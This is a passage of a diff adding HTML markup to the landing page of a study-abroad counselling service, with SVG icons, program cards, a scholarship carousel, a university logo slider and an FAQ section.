+                                    d="M33.4888 2.33732C51.0788 -4.90402 74.7375 10.3492 95.1583 10.1059C112.054 9.90458 124.917 -1.94773 142.286 1.04108C161.229 4.30087 182.771 11.4675 196.311 27.5126C209.823 43.525 204.073 64.7482 211.768 83.3776C219.978 103.254 244.371 120.756 242.796 140.051C241.244 159.064 219.234 165.093 204.324 174.576C191.463 182.756 177.07 187.574 161.728 191.613C144.966 196.024 128.585 200.247 110.135 199.366C85.6793 198.199 52.9607 207.808 36.8703 185.654C19.1764 161.292 51.8095 136.455 44.5608 109.082C38.4883 86.1502 3.04428 71.7681 0.682568 48.9991C-1.5703 27.2795 15.2076 9.8632 33.4888 2.33732Z"
+                                    fill="currentcolor"></path>
+                              </svg>
+                           </div>
+                           <div class="shape-two">
+                              <span class="svg-icon" id="faq-two-svg" data-svg-icon="assets/img/others/faq_shape02.svg">
+                                 <svg width="100%" height="100%" viewBox="0 0 54 66" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M3.76256 36.4136C7.34334 29.8191 15.1459 14.2331 17.71 4.64484" stroke="#031333" stroke-width="3.07158" stroke-linejoin="round" style="stroke-dasharray: 35, 37; stroke-dashoffset: 0"></path>
+                                    <path d="M18.1469 52.3203C25.5569 51.1365 42.6675 47.8153 51.8301 44" stroke="#031333" stroke-width="3.07158" stroke-linejoin="round" style="stroke-dasharray: 35, 37; stroke-dashoffset: 0"></path>
+                                    <path d="M12.9399 41.2119C17.218 38.6967 26.7978 32.5534 30.8916 28.1021" stroke="#031333" stroke-width="3.07158" stroke-linejoin="round" style="stroke-dasharray: 23, 25; stroke-dashoffset: 0"></path>
+                                 </svg>
+                              </span>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+
+                  <!-- <div class="col-lg-1"></div> -->
+
+                  <div class="col-lg-7 mt-4 mt-md-2">
+                     <div class="service_wrap" data-aos="fade-up" data-aos-delay="100" data-aos-duration="1000">
+                        <div class="service_head">
+                           <div class="service_icon">
+                              <svg xmlns="http://www.w3.org/2000/svg" width="32" height="26" viewBox="0 0 32 26" fill="none" data-inject-url="https://demo.ankdevelopment.in/education/4/assets/img/icons/h2_features_icon01.svg" class="injectable">
+                                 <path
+                                    d="M29.6966 5.50114C29.6966 5.50114 18.4058 0.499395 18.4028 0.498095C17.6403 0.16757 16.8319 0 16 0C15.1681 0 14.3597 0.16757 13.5972 0.498095C13.5942 0.499395 2.30338 5.50114 2.30338 5.50114C0.904 6.11 0 7.52206 0 9.1C0 10.6779 0.904 12.09 2.30338 12.6989L5 13.8934V22.1C5 24.2505 6.68225 26 8.75 26H23.25C25.3177 26 27 24.2505 27 22.1V18.6335C27 17.9155 26.4404 17.3335 25.75 17.3335C25.0596 17.3335 24.5 17.9155 24.5 18.6335V22.1C24.5 22.8168 23.9393 23.4 23.25 23.4H8.75C8.06075 23.4 7.5 22.8168 7.5 22.1V15.001C7.5 15.001 13.5942 17.7007 13.5972 17.702C14.3597 18.0324 15.1681 18.2 16 18.2C16.8318 18.2 17.6402 18.0324 18.4028 17.702C18.4058 17.7007 29.6966 12.6989 29.6966 12.6989C31.096 12.09 32 10.6779 32 9.1C32 7.52206 31.096 6.11 29.6966 5.50114ZM28.7301 10.301C28.7271 10.3023 17.4373 15.3036 17.4373 15.3036C16.9821 15.5003 16.4986 15.6 15.9999 15.6C15.5013 15.6 15.0178 15.5003 14.5627 15.3037C13.4414 14.8069 3.27281 10.3023 3.26981 10.301C2.80219 10.0983 2.5 9.62689 2.5 9.1C2.5 8.57311 2.80219 8.10173 3.26988 7.89899C3.27288 7.89769 14.5627 2.89633 14.5627 2.89633C15.0178 2.69971 15.5014 2.6 16 2.6C16.4986 2.6 16.9822 2.69971 17.4373 2.89633C17.4373 2.89633 28.7271 7.89769 28.7301 7.89899C29.1978 8.10173 29.5 8.57311 29.5 9.1C29.5 9.62689 29.1978 10.0983 28.7301 10.301Z"
+                                    fill="white"></path>
+                                 <path d="M30.75 15.161C30.0596 15.161 29.5 15.743 29.5 16.461V22.1C29.5 22.818 30.0596 23.4 30.75 23.4C31.4404 23.4 32 22.818 32 22.1V16.461C32 15.743 31.4404 15.161 30.75 15.161Z" fill="currentcolor"></path>
+                              </svg>
+                           </div>
+                           <span>
+                              <h5>Summer Programs</h5>
+                              <h3>Learn & Explore During Your Break</h3>
+                           </span>
+                        </div>
+                        <p>Dive into short-term academic and cultural experiences during your summer break. These programs allow you to earn credits while exploring new destinations, making the most of your time off.</p>
+                        <!-- <a href="" class="btn-one serv_btn">Know More <i class="fa-solid fa-chevron-right"></i></a> -->
+                        <img src="img/svg/bg-stars.svg" alt="" class="service_shape" />
+                     </div>
+
+                     <div class="service_wrap" data-aos="fade-up" data-aos-delay="100" data-aos-duration="1000">
+                        <div class="service_head">
+                           <div class="service_icon">
+                              <svg xmlns="http://www.w3.org/2000/svg" width="27" height="32" viewBox="0 0 27 32" fill="none" data-inject-url="https://demo.ankdevelopment.in/education/4/assets/img/icons/h2_features_icon02.svg" class="injectable">
+                                 <path
+                                    d="M5.0116 24.5H21.9884C24.7519 24.5 27 22.2571 27 19.5V5C27 2.24292 24.7519 0 21.9884 0H5.0116C2.24812 0 0 2.24292 0 5V27C0 29.7571 2.24812 32 5.0116 32H21.9884C24.7519 32 27 29.7571 27 27C27 26.3096 26.4391 25.75 25.7471 25.75C25.0551 25.75 24.4942 26.3096 24.4942 27C24.4942 28.3784 23.37 29.5 21.9884 29.5H5.0116C3.62998 29.5 2.5058 28.3784 2.5058 27C2.5058 25.6216 3.62998 24.5 5.0116 24.5ZM2.5058 5C2.5058 3.62158 3.62998 2.5 5.0116 2.5H21.9884C23.37 2.5 24.4942 3.62158 24.4942 5V19.5C24.4942 20.8784 23.37 22 21.9884 22H5.0116C4.09933 22 3.24335 22.2444 2.5058 22.6709V5ZM7.58005 8.4375C7.58005 7.74707 8.14091 7.1875 8.83295 7.1875H18.2297C18.9217 7.1875 19.4826 7.74707 19.4826 8.4375C19.4826 9.12793 18.9217 9.6875 18.2297 9.6875H8.83295C8.14091 9.6875 7.58005 9.12793 7.58005 8.4375Z"
+                                    fill="currentcolor"></path>
+                              </svg>
+                           </div>
+                           <span>
+                              <h5>Semester Abroad</h5>
+                              <h3>Experience University Life Internationally</h3>
+                           </span>
+                        </div>
+                        <p>Immerse yourself in a new culture for an entire semester at one of our esteemed partner universities worldwide. Engage in coursework that enriches your major while experiencing life as a local.</p>
+                        <!-- <a href="" class="btn-one serv_btn">Know More <i class="fa-solid fa-chevron-right"></i></a> -->
+
+                        <img src="img/svg/bg-stars.svg" alt="" class="service_shape" />
+                     </div>
+
+                     <div class="service_wrap" data-aos="fade-up" data-aos-delay="100" data-aos-duration="1000">
+                        <div class="service_head">
+                           <div class="service_icon">
+                              <svg xmlns="http://www.w3.org/2000/svg" width="32" height="26" viewBox="0 0 32 26" fill="none" data-inject-url="https://demo.ankdevelopment.in/education/4/assets/img/icons/h2_features_icon01.svg" class="injectable">
+                                 <path
+                                    d="M29.6966 5.50114C29.6966 5.50114 18.4058 0.499395 18.4028 0.498095C17.6403 0.16757 16.8319 0 16 0C15.1681 0 14.3597 0.16757 13.5972 0.498095C13.5942 0.499395 2.30338 5.50114 2.30338 5.50114C0.904 6.11 0 7.52206 0 9.1C0 10.6779 0.904 12.09 2.30338 12.6989L5 13.8934V22.1C5 24.2505 6.68225 26 8.75 26H23.25C25.3177 26 27 24.2505 27 22.1V18.6335C27 17.9155 26.4404 17.3335 25.75 17.3335C25.0596 17.3335 24.5 17.9155 24.5 18.6335V22.1C24.5 22.8168 23.9393 23.4 23.25 23.4H8.75C8.06075 23.4 7.5 22.8168 7.5 22.1V15.001C7.5 15.001 13.5942 17.7007 13.5972 17.702C14.3597 18.0324 15.1681 18.2 16 18.2C16.8318 18.2 17.6402 18.0324 18.4028 17.702C18.4058 17.7007 29.6966 12.6989 29.6966 12.6989C31.096 12.09 32 10.6779 32 9.1C32 7.52206 31.096 6.11 29.6966 5.50114ZM28.7301 10.301C28.7271 10.3023 17.4373 15.3036 17.4373 15.3036C16.9821 15.5003 16.4986 15.6 15.9999 15.6C15.5013 15.6 15.0178 15.5003 14.5627 15.3037C13.4414 14.8069 3.27281 10.3023 3.26981 10.301C2.80219 10.0983 2.5 9.62689 2.5 9.1C2.5 8.57311 2.80219 8.10173 3.26988 7.89899C3.27288 7.89769 14.5627 2.89633 14.5627 2.89633C15.0178 2.69971 15.5014 2.6 16 2.6C16.4986 2.6 16.9822 2.69971 17.4373 2.89633C17.4373 2.89633 28.7271 7.89769 28.7301 7.89899C29.1978 8.10173 29.5 8.57311 29.5 9.1C29.5 9.62689 29.1978 10.0983 28.7301 10.301Z"
+                                    fill="white"></path>
+                                 <path d="M30.75 15.161C30.0596 15.161 29.5 15.743 29.5 16.461V22.1C29.5 22.818 30.0596 23.4 30.75 23.4C31.4404 23.4 32 22.818 32 22.1V16.461C32 15.743 31.4404 15.161 30.75 15.161Z" fill="currentcolor"></path>
+                              </svg>
+                           </div>
+                           <span>
+                              <h5>Language Immersion</h5>
+                              <h3>Achieve Fluency Through Real-Life Practice</h3>
+                           </span>
+                        </div>
+                        <p>Boost your language skills through intensive programs that combine classroom instruction with real-world practice. Experience local customs and traditions while becoming fluent in a new language.</p>
+                        <!-- <a href="" class="btn-one serv_btn">Know More <i class="fa-solid fa-chevron-right"></i></a> -->
+                        <img src="img/svg/bg-stars.svg" alt="" class="service_shape" />
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+
+         <!-- scholarship section start -->
+         <section class="bg-gray">
+            <div class="container">
+               <div class="row gy-4">
+                  <div class="col-lg-5">
+                     <h3>Unlock scholarships worth up to <span class="down"> ₹ 3,00,000 </span> for your studies in the UK, Canada, and the US.</h3>
+
+                     <!-- <p class="mt-3">The Most Comprehensive & Personalised Study Abroad Plan, suited for your
+                            Dreams. Obsessed with Student Success.</p> -->
+
+                     <div class="d-flex gap-md-3 align-items-center flex-wrap">
+                        <a href="https://studywander.edumilestones.com" target="_blank"
+                           ><button class="btn-two">Apply Now<i class="fa-solid fa-chevron-right"></i></button
+                        ></a>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-7" data-aos="fade-up" data-aos-anchor-placement="top-bottom" data-aos-delay="300">
+                     <div class="bg-white pt-4 shadow-sm" style="border-radius: 22px">
+                        <!-- Swiper -->
+                        <div class="swiper dreamSlider">
+                           <div class="swiper-wrapper">
+                              <div class="swiper-slide">
+                                 <div>
+                                    <div class="ship-card">
+                                       <div class="profile">
+                                          <img src="img/scholarship/s-two.jpeg" alt="" />
+                                       </div>
+
+                                       <div>
+                                          <h3>Rohan</h3>
+                                          <p>New Delhi, India</p>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="swiper-slide">
+                                 <div>
+                                    <div class="ship-card">
+                                       <div class="profile">
+                                          <img src="img/scholarship/s-one.jpg" alt="" />
+                                       </div>
+
+                                       <div>
+                                          <h3>Diya Patel</h3>
+                                          <p>Ahmedabad, India</p>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="swiper-slide">
+                                 <div>
+                                    <div class="ship-card">
+                                       <div class="profile">
+                                          <img src="img/scholarship/s-three.jpg" alt="" />
+                                       </div>
+
+                                       <div>
+                                          <h3>Kiran Singh</h3>
+                                          <p>Lucknow, India</p>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="swiper-slide">
+                                 <div>
+                                    <div class="ship-card">
+                                       <div class="profile">
+                                          <img src="img/scholarship/s-four.jpg" alt="" />
+                                       </div>
+
+                                       <div>
+                                          <h3>Raj Mehta</h3>
+                                          <p>Jaipur, India</p>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- scholarship section end -->
+
+         <!-- partner section start -->
+         <section class="container">
+            <div class="title-con">
+               <h4>Global University Network</h4>
+               <h2><span class="down"> 850+</span> and expanding rapidly</h2>
+            </div>
+
+            <!-- Swiper -->
+            <div class="swiper partnerSlider">
+               <div class="swiper-wrapper">
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-1.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6 slider-items">
+                        <img src="img/university/university-2.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-3.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-4.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-5.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-6.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-7.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-8.png" alt="" />
+                     </div>
+                  </div>
+
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-9.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6 slider-items">
+                        <img src="img/university/university-10.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-11.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-12.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-13.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-14.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-15.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-16.png" alt="" />
+                     </div>
+                  </div>
+
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-17.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6 slider-items">
+                        <img src="img/university/university-18.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-19.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-20.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-21.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-22.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-23.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-24.png" alt="" />
+                     </div>
+                  </div>
+
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-25.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6 slider-items">
+                        <img src="img/university/university-26.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-27.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-28.png" alt="" />
+                     </div>
+                  </div>
+                  <div class="swiper-slide">
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-29.png" alt="" />
+                     </div>
+                     <div class="col-md-3 col-6">
+                        <img src="img/university/university-30.png" alt="" />
+                     </div>
+                  </div>
+               </div>
+               <div class="text-center mt-4">
+                  <p>
+                     <q class="f-500">
+                        Our admissions counselling service for these universities is completely <span class="down">FREE</span>. <br />
+                        Receive personalized guidance without any charges.
+                     </q>
+                  </p>
+               </div>
+            </div>
+         </section>
+         <!-- partner section end -->
+
+         <!-- why choose us start -->
+         <section class="choose-bg-con">
+            <img src="img/svg/radiant-gradient.svg" alt="" />
+            <div class="container position-relative" style="z-index: 99">
+               <div class="col-lg-7">
+                  <h2 class="text-white">Why<span class="sec-col down after-none"> Choose </span>Us</h2>
+
+                  <p class="mt-3 text-white">The Most Complete & Personalized Study Abroad Journey, Aligned with Your Dreams. Dedicated to Student Achievement.</p>
+               </div>
+
+               <div class="row mt-2 gy-4 justify-content-center">
+                  <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
+                     <div class="choose-us-card">
+                        <div class="d-flex align-items-center gap-4">
+                           <img src="img/icon/union.png" alt="" />
+                           <h3>Personalized Guidance</h3>
+                        </div>
+                        <p>We provide personalized study abroad guidance, helping you select the right university & program based on your goals. Our expert counselors offer one-on-one support from applications to visas.</p>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
+                     <div class="choose-us-card">
+                        <div class="d-flex align-items-center gap-4">
+                           <img src="img/icon/social-care.png" alt="" />
+                           <h3>Comprehensive Support</h3>
+                        </div>
+                        <p>At Study Wander, we provide comprehensive support throughout your study abroad journey, from selecting the right university to handling applications, visas, and settling in.</p>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
+                     <div class="choose-us-card">
+                        <div class="d-flex align-items-center gap-4">
+                           <img src="img/icon/rating.png" alt="" />
+                           <h3>Expert Counselors</h3>
+                        </div>
+                        <p>At Study Wander, our expert counselors offer personalized guidance to help you achieve your study abroad goals.</p>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
+                     <div class="choose-us-card">
+                        <div class="d-flex align-items-center gap-4">
+                           <img src="img/icon/social.png" alt="" />
+                           <h3>Trusted Network</h3>
+                        </div>
+                        <p>At Study Wander, our global network of top universities and industry experts offers exclusive opportunities, insights, and personalized recommendations to help you achieve your academic & career goals.</p>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
+                     <div class="choose-us-card">
+                        <div class="d-flex align-items-center gap-4">
+                           <img src="img/icon/process.png" alt="" />
+                           <h3>Transparent Process</h3>
+                        </div>
+                        <p>We believe in a transparent, stress-free process that puts you in control at every step. From selecting the right university to submitting your application.</p>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-4 col-md-6" data-aos="fade-up" data-aos-delay="200">
+                     <div class="choose-us-card">
+                        <div class="d-flex align-items-center gap-4">
+                           <img src="img/icon/scholarship.png" alt="" />
+                           <h3>Scholarships</h3>
+                        </div>
+                        <p>At Study Wander, we help you unlock valuable scholarship opportunities by identifying and guiding you through applications that align with your academic profile & financial needs.</p>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+         <!-- why choose us end -->
+
+         <section class="bg-blue-g pt-5 py-lg-0">
+            <div class="container">
+               <div class="row align-items-center gy-4">
+                  <div class="col-lg-7">
+                     <h2 class="mt-2">Our Key <span class="down z-index-1"> Services </span> at a Glance</h2>
+
+                     <p class="mt-3">We provide personalized counseling, visa assistance and ongoing career services to ensure your study abroad journey is smooth and successful.</p>
+
+                     <ul class="about-us-points p-0">
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Personalized Counseling</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Visa & Immigration Help</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Scholarships & Financial Aid</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Ongoing Support</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Career Services</div>
+                        </li>
+                        <li>
+                           <div>
+                              <div class="icon-con"><i class="fa-solid fa-check"></i></div>
+                           </div>
+                           <div>Post-Study Support</div>
+                        </li>
+                     </ul>
+                  </div>
+
+                  <div class="col-lg-5">
+                     <div class="about_sec_left d-none d-md-block">
+                        <img src="img/images/feature.png" class="img-fluid" style="mix-blend-mode: darken" alt="" />
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </section>
+
+         <!-- faq section start -->
+         <section class="faq_sec" x-data="{show : false}">
+            <div class="container">
+               <div class="title-con">
+                  <h4>Have a question?</h4>
+                  <h2>Read Our <span class="down"> FAQs </span></h2>
+               </div>
+
+               <div class="flat-accordion m-auto row align-items-start">
+                  <div class="col-lg-6 d-flex flex-column justify-content-between px-0 px-lg-3">
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           What is Study Wander?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              Study Wander is a comprehensive study abroad platform that helps students find the best universities, scholarships, and programs that align with their academic and career goals. We provide personalized counseling, application assistance, and support for students looking
+                              to study abroad in destinations like the UK, US, Canada, and more.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           How can Study Wander help me with my study abroad journey?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              We offer expert guidance throughout your study abroad process, from selecting the right university to submitting applications, securing scholarships, and navigating visa requirements. Our services ensure a smooth, personalized journey tailored to your needs and
+                              aspirations.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           Which countries can I study in with Study Wander?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>We assist students in applying to top universities across the globe, including popular study destinations like the UK, USA, Canada, Australia, New Zealand, Germany, and more.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           Is there a fee for your services?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>Study Wander offers many services, including personalized counseling and application assistance, at no charge to students. We are committed to making the study abroad process as accessible and affordable as possible.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           How do I apply for scholarships through Study Wander?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>We help you identify and apply for relevant scholarships based on your academic profile and study destination. Our experts guide you through the scholarship application process to ensure you meet all deadlines and requirements.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           How long does it take to complete the application process?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>The application timeline varies by university and program, but on average, it can take 2-6 months from researching universities to receiving your offer. Our team works efficiently to guide you through each step of the process to meet deadlines and secure your spot.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           Can you help with visa applications?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>Yes! We provide guidance on the visa application process for your chosen destination, ensuring you have the correct documentation and understand the requirements to secure your study visa.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           How do I choose the right university for me?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              Our expert counselors take the time to understand your academic interests, career goals, and personal preferences to recommend universities and programs that are the best fit for you. We offer insights into academic reputation, campus culture, financial aid options, and
+                              more.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           What documents do I need for my application?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>You will generally need academic transcripts, proof of English language proficiency (like IELTS or TOEFL), recommendation letters, a statement of purpose, and a resume or CV. Our team will guide you on which specific documents are required by each university.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           How can Study Wander help me after I get accepted?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              Once you’re accepted, Study Wander continues to support you by offering pre-departure services such as arranging accommodation, understanding your new cultural environment, and preparing you for your journey abroad. We ensure you feel confident and ready for the next
+                              phase of your academic adventure.
+                           </p>
+                        </div>
+                     </div>
+
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           I’m not sure if studying abroad is the right choice for me. Can you help?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>Absolutely! At Study Wander, we offer personalized counseling to help you assess if studying abroad aligns with your academic and career goals. Our experts will walk you through the benefits, challenges, and opportunities to ensure you make an informed decision.</p>
+                        </div>
+                     </div>
+                  </div>
+
+                  <div class="col-lg-6 d-flex flex-column justify-content-between px-0 px-lg-3">
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           How do I choose best country & university for my course?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              We understand that picking the right country and university can be overwhelming. Our team will help you evaluate your options based on your course of interest, career goals, budget, and lifestyle preferences. We guide you through researching programs, universities, and
+                              study destinations to find the best fit for you.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           I’m worried about the cost of studying abroad. How can I afford it?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              Financial concerns are common, but don’t worry—Study Wander helps you identify scholarships, financial aid options, and affordable universities. We also provide tips on budgeting and managing your finances while studying abroad so you can pursue your dreams without
+                              breaking the bank.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           How can I make sure I meet all requirements for studying abroad?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>Our experts will guide you step-by-step through the entire process, from understanding entry requirements (like grades, tests, and language proficiency) to submitting the correct documentation. We make sure you’re fully prepared and never miss a deadline.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           What if I don’t know which course or major to choose?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>
+                              We help you explore your options based on your interests, skills, and career goals. Our counselors will discuss your passions and academic strengths, helping you choose a course that aligns with your future aspirations and makes the most of your study abroad experience.
+                           </p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp">
+                        <h4 class="toggle-title">
+                           What happens if I’m overwhelmed by the application process?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>It’s totally normal to feel overwhelmed. Study Wander offers hands-on support throughout the entire application process. From university research to preparing documents and filling out forms, we guide you every step of the way so you never feel lost.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           I’m concerned about living in a foreign country. How can I adjust?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>We provide pre-departure orientation, including advice on cultural differences, accommodation, and settling into your new environment. Our team also offers ongoing support during your time abroad, helping you adapt smoothly and confidently.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           How long will the entire process take from application to acceptance?
+                           <div>
+                              <div class="accordian-icon">
+                                 <i class="fa-solid fa-angle-down"></i>
+                              </div>
+                           </div>
+                        </h4>
+                        <div class="toggle-content">
+                           <p>The timeline can vary depending on your chosen university and course, but generally, it takes about 3-6 months to complete the application process. We’ll help you stay organized and meet all deadlines to ensure a smooth, timely application.</p>
+                        </div>
+                     </div>
+                     <div class="flat-toggle wow fadeInUp" x-show="show">
+                        <h4 class="toggle-title">
+                           What if I don’t get accepted into the university I want?
